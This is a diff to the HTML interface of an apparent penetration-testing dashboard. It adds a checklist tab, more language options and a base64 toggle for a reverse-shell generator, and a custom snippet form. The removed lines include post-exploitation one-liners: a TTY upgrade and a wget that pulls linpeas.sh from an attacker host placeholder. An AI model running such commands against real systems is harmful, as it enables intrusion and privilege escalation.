@@ -61,6 +61,9 @@
                         <button class="nav-link active py-1 px-2 text-light bg-black border-secondary" id="tab-btn-notes" data-bs-toggle="tab" data-bs-target="#tab-notes" type="button">Notes</button>
                     </li>
                     <li class="nav-item">
+                        <button class="nav-link py-1 px-2 text-secondary" id="tab-btn-checklist" data-bs-toggle="tab" data-bs-target="#tab-checklist" type="button">Checklist</button>
+                    </li>
+                    <li class="nav-item">
                         <button class="nav-link py-1 px-2 text-secondary" id="tab-btn-files" data-bs-toggle="tab" data-bs-target="#tab-files" type="button">File Manager (shared/)</button>
                     </li>
                 </ul>
@@ -88,6 +91,22 @@
                                 </div>
                             </div>
                         </div>
+                    </div>
+
+                     <!-- Checklist Tab -->
+                    <div class="tab-pane fade flex-grow-1 w-100" id="tab-checklist">
+                         <div class="d-flex h-100 flex-column p-2">
+                             <div class="d-flex justify-content-between mb-2">
+                                 <div class="input-group input-group-sm w-auto flex-grow-1 me-2">
+                                     <input type="text" class="form-control bg-dark text-light border-secondary" id="new-checklist-item" placeholder="New Item...">
+                                     <button class="btn btn-primary" id="btn-add-checklist">Add</button>
+                                 </div>
+                                 <button class="btn btn-sm btn-secondary py-0" id="btn-refresh-checklist"><i class="bi bi-arrow-clockwise"></i></button>
+                             </div>
+                             <div class="flex-grow-1 overflow-auto border border-secondary bg-black p-2" id="checklist-container">
+                                 <!-- Items injected here -->
+                             </div>
+                         </div>
                     </div>
 
                     <!-- Files Tab -->
@@ -209,12 +228,23 @@
                     </h2>
                     <div id="collapseShells" class="accordion-collapse collapse" data-bs-parent="#toolsAccordion">
                         <div class="accordion-body p-2">
-                            <select class="form-select form-select-sm bg-dark text-light border-secondary mb-2" id="revshell-type">
-                                <option value="bash">Bash -i</option>
-                                <option value="python">Python3 PTY</option>
-                                <option value="nc">Netcat -e</option>
-                                <option value="powershell">PowerShell</option>
-                            </select>
+                            <div class="d-flex mb-2">
+                                <select class="form-select form-select-sm bg-dark text-light border-secondary me-2" id="revshell-type">
+                                    <option value="bash">Bash -i</option>
+                                    <option value="python">Python3 PTY</option>
+                                    <option value="nc">Netcat -e</option>
+                                    <option value="powershell">PowerShell</option>
+                                    <option value="php">PHP</option>
+                                    <option value="perl">Perl</option>
+                                    <option value="ruby">Ruby</option>
+                                    <option value="golang">Golang</option>
+                                    <option value="socat">Socat</option>
+                                </select>
+                                <div class="form-check d-flex align-items-center">
+                                    <input class="form-check-input bg-dark border-secondary" type="checkbox" id="revshell-base64">
+                                    <label class="form-check-label text-light small ms-1" for="revshell-base64">B64</label>
+                                </div>
+                            </div>
                             <textarea class="form-control form-control-sm bg-black text-light border-secondary mb-2" id="revshell-output" rows="3" readonly></textarea>
                             <div class="d-grid">
                                 <button class="btn btn-sm btn-primary py-0" id="btn-copy-revshell">Copy to Clipboard</button>
@@ -232,11 +262,18 @@
                     </h2>
                     <div id="collapseSnippets" class="accordion-collapse collapse" data-bs-parent="#toolsAccordion">
                         <div class="accordion-body p-2">
-                            <div class="list-group">
-                                <button class="list-group-item list-group-item-action bg-dark text-light small py-1 snippet-btn" data-cmd="python3 -c 'import pty; pty.spawn(\042/bin/bash\042)'">Upgrade TTY (Py3)</button>
-                                <button class="list-group-item list-group-item-action bg-dark text-light small py-1 snippet-btn" data-cmd="export TERM=xterm">Export TERM</button>
-                                <button class="list-group-item list-group-item-action bg-dark text-light small py-1 snippet-btn" data-cmd="stty raw -echo; fg">Fix Stty</button>
-                                <button class="list-group-item list-group-item-action bg-dark text-light small py-1 snippet-btn" data-cmd="wget http://{LHOST}:8000/linpeas.sh">Wget Linpeas</button>
+                             <div class="input-group input-group-sm mb-2">
+                                 <button class="btn btn-sm btn-outline-success w-100" type="button" data-bs-toggle="collapse" data-bs-target="#addSnippetForm">
+                                     + New Snippet
+                                 </button>
+                            </div>
+                            <div class="collapse mb-2" id="addSnippetForm">
+                                <input type="text" class="form-control form-control-sm bg-black text-light border-secondary mb-1" id="new-snippet-name" placeholder="Name">
+                                <textarea class="form-control form-control-sm bg-black text-light border-secondary mb-1" id="new-snippet-cmd" placeholder="Command" rows="2"></textarea>
+                                <button class="btn btn-sm btn-success w-100" id="btn-save-snippet">Save</button>
+                            </div>
+                            <div class="list-group" id="snippets-list">
+                                <!-- Dynamic Snippets -->
                             </div>
                         </div>
                     </div>
